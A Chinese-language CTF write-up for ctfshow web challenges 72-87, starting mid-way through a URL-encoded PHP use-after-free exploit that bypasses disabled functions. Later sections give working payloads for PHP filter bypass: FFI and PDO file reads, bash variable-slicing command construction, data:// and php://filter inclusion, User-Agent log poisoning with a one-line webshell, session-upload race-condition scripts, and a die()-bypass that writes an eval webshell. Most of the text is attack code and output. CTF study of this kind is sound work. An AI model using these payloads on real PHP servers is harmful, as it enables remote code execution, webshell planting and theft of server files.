AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')%3B%0A%0A%20%20%20%20trigger_uaf('x')%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B'args'%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E
```

![image-20231110161136169](assets/image-20231110161136169.png)



如果hackbar编码不对，可以选择拿到burp来

通过burpsuite抓包，然后把post的c替换成exp，接着按照图中所示步骤进行url编码

![image-20231110161545267](assets/image-20231110161545267.png)

## web73（突破禁用函数）

这个题不能用上个题的uaf了，老姿势仍然可用，第一步查看根目录文件
c=var_export(scandir('/'));exit();
![image.png](assets/1637905712177-72521d9e-8cba-4513-abed-f168f3dcc0fb.png)
第二步包含
![image-20231117104838941](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/image-20231117104838941.png)
最终payload：c=include('/flagc.txt');exit();

## web74（突破禁用函数）

```php
Warning: scandir() has been disabled for security reasons in /var/www/html/index.php(19) : eval()'d code on line 1
```

scandir被禁用了，那么就构造php代码读文件

```php
c=?><?php $dir='/';
if($dh = opendir($dir)){
while (($file = readdir($dh)) !== false)
echo $file.' ';
}
exit();?>
    
    c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");};exit();
```

![image-20231117104701235](assets/image-20231117104701235.png)
得到文件在flagx.txt
最终payload：c=include('/flagx.txt');exit();

## web75（PDO）

这次读目录不可行了，那么就换个姿势

```php
c=?><?php 
$a=new DirectoryIterator("glob:///*");
foreach($a as $f)
{echo($f.' ');}
exit();
?>
    
或
c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");};exit();
```

![image-20231117104648936](assets/image-20231117104648936.png)

还是一样通过glob协议找到文件为flag36.txt，但是include限制文件夹，之前的uaf poc因为strlen被禁了获取不到system地址也没法用了，但是既然php受限制，那么mysql的load_file函数呢，可以通过其他应用比如说mysql来访问，如下使用pdo

```php
c=try{
  $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');
  foreach($dbh->query('select load_file("/flag36.txt")') as $row)
		{echo($row[0])."|"; }
  $dbh = null;
}
catch (PDOException $e)
{echo $e->getMessage();exit(0);}
exit(0);
```

> PHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。
> PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据

## web76（PDO）

做法同上，flag在flag36d.txt

## web77（PDO）

这个题不让用mysql了，前两个题的做法在这里行不通了
先读一下根目录下的所有文件

```php
c=?><?php 
$a=new DirectoryIterator("glob:///*");
foreach($a as $f)
{echo($f.' ');}
exit();
?>
```

![image-20231117104628121](assets/image-20231117104628121.png)
有两个可疑文件，flag36x.txt和readflag，留着备用，先放payload

```php
c=$ffi = FFI::cdef("int system(const char *command);");
$a='/readflag > 1.txt';
$ffi->system($a);

//先利用ffi执行readflag文件，由于没有回显，所以将内容输出到flag.txt文件
c=?><?php $ffi = FFI::cdef("int system(const char *command);");$ffi->system("/readflag >flag.txt");exit();
//再url后拼接访问flag.txt即可
```

看了hint说这是php7.4特性，留个链接参考：[php7.4中的FFI介绍](https://www.php.cn/php-weizijiaocheng-415807.html)
​

## web118（通过系统变量构造）

开启环境后发现只有一个输入框，右键查看源码后发现了hint，观察数据包也可以看到此处提交的请求方式是POST：
![image.png](assets/1638435378827-18da7089-ca91-4ef6-a5cc-9deb33af4eb9.png)
经过测试发现过滤了字母和数字？应该是吧，所以直接构造是不行了，要考虑其他姿势
看了hint是通过系统变量来构造，演示一下：

```shell
┌──(root💀kali)-[~]
└─# echo ${PWD} 
/root
                                                                                                      
┌──(root💀kali)-[~]
└─# echo ${PWD:0:1}      #表示从0下标开始的第一个字符
/                                                                                                                                                                                       
┌──(root💀kali)-[~]
└─# echo ${PWD:~0:1}      #从结尾开始往前的第一个字符
t
                                                                                
┌──(root💀kali)-[~]
└─# echo ${PWD:~0}      
t
                                                                             
┌──(root💀kali)-[~]
└─# echo ${PWD:~A}       #所以字母和0具有同样作用             
t
                                                                    
┌──(root💀kali)-[~]
└─# echo ${PATH}                            
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
                                                                    
┌──(root💀kali)-[~]
└─# echo ${PATH:~A}                
n
                                                                                                    
┌──(root💀kali)-[~]
└─# ls                                      
Desktop  Documents  Downloads  flag.txt  Music  Pictures  Public  Templates  Videos
                                                                                              
┌──(root💀kali)-[~]
└─# ${PATH:~A}l flag.txt
     1  flag{test}
     
     
从中发现我们可以构造出nl命令进行读取

${${PATH}
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

${PWD}
/var/www/html

所以payload为
${PATH:~A}${PWD:~A} ????.???
```

![image-20231117104610160](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/image-20231117104610160.png)
${PATH}是系统变量的路径，可以看到如果拼凑其中某几个字母那么是不是就可执行命令了？所以考虑拼凑执行nl
由于不同系统变量也不同，所以不能拿某个位置的字符去当做payload，要找个通用的，观察发现最后一层目录基本是/bin，那么就可考虑把这个/bin中的n拿出来：
![image.png](assets/1638436247900-3698b8bb-e318-41b0-85f8-00d7120f7a7c.png)
由于过滤了数字，所以采用第二种方法
有了n之后还要构造l，因为php默认目录想/var/www/html，那也可以把l拿出来了
构造：${PWD:~A}，由于我这里是linux所以不做演示，原理是一样的，提示又说flag在flag.php中，于是考虑通配符，所以最终构造：
payload:

```
${PATH:~A}${PWD:~A} ????????
${PATH:~A}${PWD:~A} ????.???
${PATH:${#HOME}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}} ?${PATH:${#RANDOM}:${#SHLVL}}??.???

```

![image.png](assets/1638436421114-1349aeb1-b1a9-4717-9d30-2265b5cccaaf.png)
拿到flag

## web119（通过系统变量构造）

这次在前面的基础上把path给禁了，也就是我们无法获得n这个字母，也就无法构成了nl命令。接下来我们尝试构造一下`/bin/cat`，而想要匹配到我们至少需要一个`/`符号和一个`cat`中的一个字母，这里使用`${SHLVL}`来配合构造`/`

> SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时${SHLVL}=1，然后在此shell中再打开一个shell时$SHLVL=2。

![image-20231117104541575](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/assets/image-20231117104541575.png)
一般给的权限都是www-data，所以我们用`${USER}`可以获得“www-data”，而我们要取到at的话需要`${USER:~2:2}`，但数字是被禁了，所以接下来我们还需要想想怎么构造出2，翻了翻，这要什么来什么了，看见php的版本是7.3.22，正好包含数字2，所以利用`PHP_VERSION`
[![img](assets/3%60%2540_Y1%25241%5DVGXB1YAX_O%2540YZL.png)](https://blog-file-1302856486.file.myqcloud.com/Web1000(一)/命令执行/web119/3`%40_Y1%241]VGXB1YAX_O%40YZL.png)
所以思路很清晰了，构造payload如下

```
${HOME:${#HOSTNAME}:${#SHLVL}}     ====>   t

${PWD:${Z}:${#SHLVL}}    ====>   /

/bin/cat flag.php

1. ${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???

2. ${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}?${USER:~${PHP_VERSION:~A}:${PHP_VERSION:~A}} ????.???
```

回车后右键源码看到flag


## web120（通过系统变量构造）

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['code'])){
    $code=$_POST['code'];
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){    
        if(strlen($code)>65){
            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
        }
        else{
        echo '<div align="center">'.system($code).'</div>';
        }
    }
    else{
     echo '<div align="center">evil input</div>';
    }
}

?>
```

这次终于看到代码知道过滤了什么了，不过这次要构造/bin/cat不是构造/???/??t了，而是/???/?a?
这个a怎么拿到呢，在php中，默认的用户是www-data，于是就可以通过${USER:~A}得到
此外还对输入加入了长度限制，上一题构造/的方法行不通了，所以使用下面这种：
payload：

```php
code=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???
```

翻到最下面就看到flag了
![image.png](assets/1638437907710-586b0ff6-1105-4e91-8411-6a5956ea960a.png)

### web121（通过系统变量构造）

```php
<?php
if(isset($_POST['code'])){
    $code=$_POST['code'];
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){    
        if(strlen($code)>65){
            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
        }
        else{
        echo '<div align="center">'.system($code).'</div>';
        }
    } 
```

这次把USER给禁了，首先我们现在可以利用的是PWD，也就是“/var/www/html”，对应了一下bin中的命令，发现我们可以取r来构造`/bin/rev`取反命令读取文件，也就是我们需要构造出`${PWD:3:1}`的效果

```php
这里我们可以用${IFS}和${#}分别替代

${#IFS}在ubuntu等系统中值为3，我在kali中测试值为4

${#}为添加到shell的参数个数，${##}则为值
```

所以构成payload如下

```php
code=${PWD::${##}}???${PWD::${##}}${PWD:${#IFS}:${##}}?? ????.???
```

![img](assets/(Q6E%60%5BJ3U4RPV9O)RWZA%60NV.png)
接着去kali里面再取反一次即可得到flag

### web122（通过系统变量构造）

```php
PHP
if(isset($_POST['code'])){
    $code=$_POST['code'];
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\>|\'|\"|\`|\||\,/', $code)){    
        if(strlen($code)>65){
            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
        }
        else{
        echo '<div align="center">'.system($code).'</div>';
        }
    } 
```

这次把`PWD`和`#`都给禁了😢，这次我们换另一个命令`/bin/base64`，这次放开了HOME，我们就用HOME来获取`/`，数字1的话我们没法使用`${##}`了，这里使用`$?`

> `$?` 最后运行的命令的结束代码（返回值）即执行上一个指令的返回值 (显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误)

这里找了几个报错资料和对应的值

```php
CODE
"OS error code   1:  Operation not permitted"
"OS error code   2:  No such file or directory"
"OS error code   3:  No such process"
"OS error code   4:  Interrupted system call"
"OS error code   5:  Input/output error"
"OS error code   6:  No such device or address"
"OS error code   7:  Argument list too long"
"OS error code   8:  Exec format error"
"OS error code   9:  Bad file descriptor"
"OS error code  10:  No child processes"
```

利用`<A`的报错就能返回值1，根据题目fuzz提示，后面的base64中的4我们可以利用`${RANDOM}`来获得(因为具有随机性，所以要多尝试直到随机出4来)，到这里思路很清晰了，构造payload

```php
code=<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???
```

写个脚本来跑

```php
PYTHON
#-- coding:UTF-8 --
# Author:dota_st
# Date:2021/2/19 12:17
# blog: www.wlhhlc.top
import requests

url = "http://3f405f9a-8ca5-4519-aef8-95943df5d5de.chall.ctf.show:8080/"
data = {'code': r'<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???'}
while True:
    result = requests.post(url=url, data=data)
    if "PD9waHA" in result.text:
        print(result.text)
        break
```

[![img](assets/D%2540_HYTR(%5B9%7D6)KJBT45VBDF.png)](https://blog-file-1302856486.file.myqcloud.com/Web1000(一)/命令执行/web122/D%40_HYTR([9}6)KJBT45VBDF.png)
再进行base64解码即可得到flag

### web124（通过系统变量构造）

```php
PHP
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

分析一波源码，get传参c，并且长度不能超过80，设置了黑名单和白名单和正则过滤。按照提示我们去找找一些数学函数进行使用，这么多白名单也注定了有多种payload，这里我使用`base_convert()`和`getallheaders`配合使用
![img](https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web124/RJK%29FW%25W%5DI%7D7HR%5DPECDK0HP.png)

![image-20231110165734339](assets/image-20231110165734339.png)

注意，因为正则会匹配字母，所以我们需要通过`base_convert()`进行一个转换

```php
echo base_convert('system',36,10);
//得到1751504350，从36进制转换到10进制，36进制包含10个数字和26个字母

echo base_convert('getallheaders',30,10);
//得到8768397090111664438，这里不使用36进制是因为精度会丢失，尝试到30的时候成功
```

所以构造payload如下

```php
?c=$pi=base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)(){1}) 
```

这里用一个变量来缩小payload长度，但注意变量名要取白名单中的名字进行命名，否则会被ban
![image-20231110165810018](assets/image-20231110165810018.png)
成功获得flag

# 0x03 文件包含

## 一些参考解法

```php
if(isset($_GET['file'])){
    $file = $_GET['file'];
   // $file = str_replace("php", "???", $file);
    include($file);
}
```



```php
1.data://伪协议转化输入流，执行php代码
1）直接执行
?file=data://text/plain,<?phP system('tac flag.php');?>
2）编码执行
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs= # <?php system('cat flag.php');
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw==   # <?php system('ls');
3）结合利用php性质做绕过
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw== # <?php phpinfo();
?file=data://text/plain,<?= `tac f*`;?>
?file=data://text/plain,<?Php echo `tac f*`;?>  # 可以无 ；


2.php://filter伪协议读取源码
?file=php://filter/convert.base64-encode/resource=flag.php
?file=php://filter/read=convert.base64-encode/resource=flag.php

3.php://input伪协议执行post的php代码
GET:?file=php://input
POST:<?php system('ls'); ?>

```



## web78（签到题）

```php
<?php

if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
}
```

哈哈，第一题都是来练手的，没有任何过滤,
payload：

```php
/?file=php://filter/convert.base64-encode/resource=flag.php
//这个flag.php是怎么来的呢?

1.可以是dirsearch扫描到的
2.用data协议执行php代码
?file=data://text/plain,<?php system('ls');?>
?file=data://text/plain,<?php system('tac flag.php');?>
    
```



## web79（日志包含）

```php
<?php

if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

### 解法一：大小写/其他伪协议绕过过滤

```php
?file=data://text/plain,<?phP system('tac flag.php');?>
?file=php://filter/convert.base64-encode/resource=flag.php
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw==   # <?php system('ls');

?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs= # <?php system('cat flag.php');

法二: data协议 + 利用php性质绕过

payload:

?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw== # <?php phpinfo();
?file=data://text/plain,<?= `tac f*`;?>
?file=data://text/plain,<?Php echo `tac f*`;?>  # 可以无 ；
```

### 解法二：包含日志文件

把php过滤掉了，那么换姿势，尝试日志包含，默认日志路径：

```php
/var/log/nginx/access.log
/var/log/apache/access.log
/var/log/apache2/access.log
```

，需要根据服务器类型来判断，具体情况具体分析嘛，包含一下日志看看
![image.png](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/ctfshow_web%2525E5%25258F%252582%2525E8%252580%252583/assets/1638207962043-8b8078be-bb20-43fd-9b71-9b4a5ad0a858.png)
日志包含是可用的，可以看到包含的内容会被写入日志中，那么直接包含个一句话木马看看，这里直接包含到UA里，别问，问就是懒，防止被url编码了
![image.png](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/ctfshow_web%2525E5%25258F%252582%2525E8%252580%252583/assets/1638208113621-5b4b44bf-1217-438c-9814-d1e90607af21.png)
![image.png](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/ctfshow_web%2525E5%25258F%252582%2525E8%252580%252583/assets/1638208855966-fba3c5fd-830e-479d-a141-42c9a25d2fd4.png)
已经成功包含了啊，接下来就是找flag了
![image.png](assets/1638208903819-2f6ba511-6ca1-41fe-8005-0ea5a557c6bb.png)
最终payload写马：

```
<?=system('cat flag.php');?>
```

右键查看源码即可
注意是先写UA，即先把马写到日志中去，然后再去包含一次日志，让其执行，这样才会看到执行结果

## web80（日志包含）

```php
<?php

if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

日志包含，做法同上

## web81（日志包含）

```php
<?php

if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

同上

## web82（条件竞争，利用session文件包含）

```php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    include($file);
}
```

这次把`.`给过滤了，日志包含使用不了，我们使用session文件包含，先了解一些知识点，在php5.4之后php.ini开始有几个默认选项

> 1.session.upload_progress.enabled = on
> 2.session.upload_progress.cleanup = on
> 3.session.upload_progress.prefix = “upload_progress_”
> 4.session.upload_progress.name = “PHP_SESSION_UPLOAD_PROGRESS”
> 5.session.use_strict_mode=off
>
> 第一个表示当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中
> 第二个表示当文件上传结束后，php将会立即清空对应session文件中的内容
> 第三和第四个`prefix+name`将表示为session中的键名
> 第五个表示我们对Cookie中sessionID可控

简而言之，我们可以利用`session.upload_progress`将木马写入session文件，然后包含这个session文件。不过前提是我们需要创建一个session文件，并且知道session文件的存放位置。因为`session.use_strict_mode=off`的关系，我们可以自定义sessionID
linux系统中session文件一般的默认存储位置为 /tmp 或 /var/lib/php/session

例如我们在Cookie中设置了PHPSESSID=flag，php会在服务器上创建文件：/tmp/sess_flag，即使此时用户没有初始化session，php也会自动初始化Session。 并产生一个键值，为`prefix+name`的值，最后被写入sess_文件里
还有一个关键点就是`session.upload_progress.cleanup`默认是开启的，只要读取了post数据，就会清除进度信息，所以我们需要利用条件竞争来pass，写一个脚本来完成

```python
PYTHON
#-- coding:UTF-8 --
# Author:dota_st
# Date:2021/2/20 23:51
# blog: www.wlhhlc.top
import io
import requests
import threading
url = 'http://453228ae-28f2-4bb0-b401-83514feae8df.chall.ctf.show:8080/'

def write(session):
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("tac f*");?>dotast'
    }
    while True:
        f = io.BytesIO(b'a' * 1024 * 10)
        response = session.post(url,cookies={'PHPSESSID': 'flag'}, data=data, files={'file': ('dota.txt', f)})
def read(session):
    while True:
        response = session.get(url+'?file=/tmp/sess_flag')
        if 'dotast' in response.text:
            print(response.text)
            break
        else:
            print('retry')

if __name__ == '__main__':
    session = requests.session()
    write = threading.Thread(target=write, args=(session,))
    write.daemon = True
    write.start()
    read(session)
```

运行后得到flag

## web83(条件竞争，利用session文件包含)

```php
PHP
session_unset();
session_destroy();
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);

    include($file);
}
```

继续利用session文件包含，使用上题脚本运行即可得到flag

## web84(条件竞争，利用session文件包含)

```php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    system("rm -rf /tmp/*");
    include($file);
}
```

加了一个`rm -rf`，但没关系，我们是条件竞争，只要一直传就有机会能执行，继续跑上面的脚本拿flag

## web85(条件竞争，利用session文件包含)

```php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    if(file_exists($file)){
        $content = file_get_contents($file);
        if(strpos($content, "<")>0){
            die("error");
        }
        include($file);
    }
}
```

这次会匹配调用die，我们依然使用条件竞争进行pass，不过这次我们多加点线程

```python
import io
import requests
import threading
url = 'http://8c42100f-3744-4c9f-83d4-5ac626e78719.chall.ctf.show:8080/'

def write(session):
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS': '<?php system("tac f*");?>dotast'
    }
    while True:
        f = io.BytesIO(b'a' * 1024 * 10)
        response = session.post(url,cookies={'PHPSESSID': 'flag'}, data=data, files={'file': ('dota.txt', f)})
def read(session):
    while True:
        response = session.get(url+'?file=/tmp/sess_flag')
        if 'dotast' in response.text:
            print(response.text)
            break
        else:
            print('retry')

if __name__ == '__main__':
    session = requests.session()
    for i in range(30):
        threading.Thread(target=write, args=(session,)).start()
    for i in range(30):
        threading.Thread(target=read, args=(session,)).start()
```

运行后得到flag

## web86(条件竞争，利用session文件包含)

```php
define('还要秀？', dirname(__FILE__));
set_include_path(还要秀？);
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    include($file);
}
```

继续使用上题脚本跑，跑完得到flag

## web87(绕过file_put_content()中的死亡exit())

参考先知社区文章：file_put_content和死亡·杂糅代码之缘（本地有）

```php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $content = $_POST['content'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);
}
```

```php
先代码分析，主要传入两个参数，一个post一个get，过滤了php  data  :  .   
file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content); 
因为urldecode($file)，所以我们在传入时要对file传入的东西进行二次编码 
因为有die(与exit意思一样)，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制），所以我们要绕过他 
这个<?php exit; ?>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。 $file是我们我们可控的协议流，我们使用base64编码，在解码时去掉退出代码中不支持的字符，变为phpdie，在后面加上aa使得能正常解码phpdieaa（base64编码解码特性，4字节一组）
```

怎么操作呢？

```php
第一，get传参file写入文件并且进行base64解码，即
?file=php://filter/write=convert.base64-decode/resource=1.php
因为源码中有一次urldecode，所以我们需要对其进行两次url编码
两次编码：php://filter/write=convert.base64-decode/resource=1.php
%2570%2568%2570%253A%252F%252F%2566%2569%256C%2574%2565%2572%252F%2577%2572%2569%2574%2565%253D%2563%256F%256E%2576%2565%2572%2574%252E%2562%2561%2573%2565%2536%2534%252D%2564%2565%2563%256F%2564%2565%252F%2572%2565%2573%256F%2575%2572%2563%2565%253D%2531%252E%2570%2568%2570

第二，post传参content为base64编码后的一句话木马，但注意的是前面剩下phpdie，一共6个字符，所以需要再加2个字符变8个
因为base64算法解码时是4个byte一组
content=aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==
base64编码：<?php @eval($_POST[a]);?>
    
```

post发送请求后访问1.php发现一句话木马已经写入，post传参数即可可以执行命令。步骤过于繁琐，我写一个脚本来完成

```python
import requests

url = "http://910b741c-8aca-41b0-97c4-a29a2f7d1335.challenge.ctf.show//"
#经过两次url编码的php://filter/write=convert.base64-decode/resource=1.php
get_data = "%2570%2568%2570%253A%252F%252F%2566%2569%256C%2574%2565%2572%252F%2577%2572%2569%2574%2565%253D%2563%256F%256E%2576%2565%2572%2574%252E%2562%2561%2573%2565%2536%2534%252D%2564%2565%2563%256F%2564%2565%252F%2572%2565%2573%256F%2575%2572%2563%2565%253D%2531%252E%2570%2568%2570"
get_url = url + "?file=" + get_data
data = {
    'content': 'aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg=='#<?php @eval($_POST[a]);?>
}
res = requests.post(url=get_url, data=data)
shell_url = url + "1.php"
test = requests.get(shell_url)
if(test.status_code == 200):
    print("[*]getshell成功")
    shell_data = {
        'a': 'system("cat fl0g.php");'
    }
    result = requests.post(url=shell_url, data=shell_data)
    print(result.text)
```

![image-20231111113626172](assets/image-20231111113626172.png)

